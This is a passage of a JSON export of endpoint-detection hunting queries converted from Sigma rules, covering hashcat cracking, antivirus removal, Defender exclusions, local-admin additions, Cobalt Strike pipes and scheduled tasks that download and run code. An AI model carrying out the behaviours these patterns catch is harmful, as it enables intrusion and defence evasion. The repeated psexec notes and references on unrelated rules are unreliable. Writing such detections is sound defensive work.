            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\ManageEngine\\ServiceDesk\\\" and src.process.image.path contains \"\\java.exe\") and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not ((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \" stop\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 367
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1110"
            ],
            "name": "HackTool - Hashcat Password Cracker Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\hashcat.exe\" or (tgt.process.cmdline contains \"-a \" and tgt.process.cmdline contains \"-m 1000 \" and tgt.process.cmdline contains \"-r \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 368
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Potential Suspicious Browser Launch From Document Reader Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"Acrobat Reader\" or src.process.image.path contains \"Microsoft Office\" or src.process.image.path contains \"PDF Reader\") and (tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\firefox.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\maxthon.exe\" or tgt.process.image.path contains \"\\seamonkey.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\" or tgt.process.image.path contains \"\") and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 369
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential evasion or obfuscation attempts using bogus path traversal via the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Command Line Path Traversal Evasion Attempt",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Windows\\\" and (tgt.process.cmdline contains \"\\..\\Windows\\\" or tgt.process.cmdline contains \"\\..\\System32\\\" or tgt.process.cmdline contains \"\\..\\..\\\")) or tgt.process.cmdline contains \".exe\\..\\\") and (not (tgt.process.cmdline contains \"\\Google\\Drive\\googledrivesync.exe\\..\\\" or tgt.process.cmdline contains \"\\Citrix\\Virtual Smart Card\\Citrix.Authentication.VirtualSmartcard.Launcher.exe\\..\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 370
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "PUA - CleanWipe Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SepRemovalToolNative_x64.exe\" or (tgt.process.image.path contains \"\\CATClean.exe\" and tgt.process.cmdline contains \"--uninstall\") or (tgt.process.image.path contains \"\\NetInstaller.exe\" and tgt.process.cmdline contains \"-r\") or (tgt.process.image.path contains \"\\WFPUnins.exe\" and (tgt.process.cmdline contains \"/uninstall\" and tgt.process.cmdline contains \"/enterprise\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 371
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Regsvr32 Commandline Flag Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\regsvr32.exe\" and (tgt.process.cmdline contains \" -i:\" or tgt.process.cmdline contains \" /i:\" or tgt.process.cmdline contains \" \u2013i:\" or tgt.process.cmdline contains \" \u2014i:\" or tgt.process.cmdline contains \" \u2015i:\")) and (not tgt.process.cmdline contains \" -n \" or tgt.process.cmdline contains \" /n \" or tgt.process.cmdline contains \" \u2013n \" or tgt.process.cmdline contains \" \u2014n \" or tgt.process.cmdline contains \" \u2015n \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 372
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of \"reg.exe\" to add Defender folder exclusions. Qbot has been seen using this technique to add exclusions for folders within AppData and ProgramData.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" or tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\") and (tgt.process.cmdline contains \"ADD \" and tgt.process.cmdline contains \"/t \" and tgt.process.cmdline contains \"REG_DWORD \" and tgt.process.cmdline contains \"/v \" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \"0\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 373
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1098"
            ],
            "name": "User Added to Local Administrators Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \" administrators \" or tgt.process.cmdline contains \" administrateur\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 374
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Start of NT Virtual DOS Machine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ntvdm.exe\" or tgt.process.image.path contains \"\\csrstub.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 375
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential process patterns related to Cobalt Strike beacon activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential CobaltStrike Process Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cmd.exe /C whoami\" and src.process.image.path contains \"C:\\Temp\\\") or ((src.process.image.path contains \"\\runonce.exe\" or src.process.image.path contains \"\\dllhost.exe\") and (tgt.process.cmdline contains \"cmd.exe /c echo\" and tgt.process.cmdline contains \"> \\\\.\\pipe\")) or ((src.process.cmdline contains \"cmd.exe /C echo\" and src.process.cmdline contains \" > \\\\.\\pipe\") and tgt.process.cmdline contains \"conhost.exe 0xffffffff -ForceV1\") or (src.process.cmdline contains \"/C whoami\" and tgt.process.cmdline contains \"conhost.exe 0xffffffff -ForceV1\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 376
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"runexehelper.exe\" binary as a proxy to launch other programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Lolbin Runexehelper Use As Proxy",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\runexehelper.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 377
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Command Patterns In Scheduled Task Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (((tgt.process.cmdline contains \"/sc minute \" or tgt.process.cmdline contains \"/ru system \") and (tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd /r\" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \")) or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -w hidden \" or tgt.process.cmdline contains \" bypass \" or tgt.process.cmdline contains \" IEX\" or tgt.process.cmdline contains \".DownloadData\" or tgt.process.cmdline contains \".DownloadFile\" or tgt.process.cmdline contains \".DownloadString\" or tgt.process.cmdline contains \"/c start /min \" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"mshta http\" or tgt.process.cmdline contains \"mshta.exe http\") or ((tgt.process.cmdline contains \":\\ProgramData\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Tmp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\\" or tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Temp%\" or tgt.process.cmdline contains \"%tmp%\") and (tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"curl\" or tgt.process.cmdline contains \"wscript\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 378
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "REGISTER_APP.VBS Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\register_app.vbs\" and tgt.process.cmdline contains \"-register\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 379
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1216"
            ],
            "name": "Execute Code with Pester.bat",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Pester\" and tgt.process.cmdline contains \"Get-Help\")) or ((tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"pester\" and tgt.process.cmdline contains \";\")) and (tgt.process.cmdline contains \"help\" or tgt.process.cmdline contains \"?\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 380
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Base64 Encoded MpPreference Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"QWRkLU1wUHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"FkZC1NcFByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"BZGQtTXBQcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"U2V0LU1wUHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"NldC1NcFByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"TZXQtTXBQcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"YWRkLW1wcHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"FkZC1tcHByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"hZGQtbXBwcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"c2V0LW1wcHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"NldC1tcHByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"zZXQtbXBwcmVmZXJlbmNlI\") or (tgt.process.cmdline contains \"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 381
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
